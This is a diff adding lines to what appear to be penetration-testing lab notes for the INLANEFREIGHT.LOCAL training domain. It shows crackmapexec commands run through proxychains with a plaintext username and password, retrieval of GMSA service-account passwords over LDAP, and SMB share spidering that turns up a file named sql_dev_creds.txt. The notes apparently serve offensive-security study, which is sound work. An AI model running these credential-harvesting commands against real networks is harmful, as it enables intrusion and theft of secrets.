@@ -282,6 +282,19 @@ SMB         224.0.0.1       445    DC01             [*] Windows 10.0 Build 17763
 LDAP        224.0.0.1       636    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
 LDAP        224.0.0.1       636    DC01             [*] Getting GMSA Passwords
 LDAP        224.0.0.1       636    DC01             Account: svc_devadm$          NTLM: 
+
+
+
+
+searching for txt
+❯ proxychains4 -q crackmapexec smb 172.16.15.3 -u Atul -p 'hooters1' --spider DEV --regex txt
+SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\Atul:hooters1 
+SMB         172.16.15.3     445    DC01             [*] Started spidering
+SMB         172.16.15.3     445    DC01             [*] Spidering .
+SMB         172.16.15.3     445    DC01             //172.16.15.3/DEV/note.txt [lastm:'2022-12-08 13:32' size:242]
+SMB         172.16.15.3     445    DC01             //172.16.15.3/DEV/sql_dev_creds.txt [lastm:'2022-12-08 14:36' size:40]
+
 ```
 
 
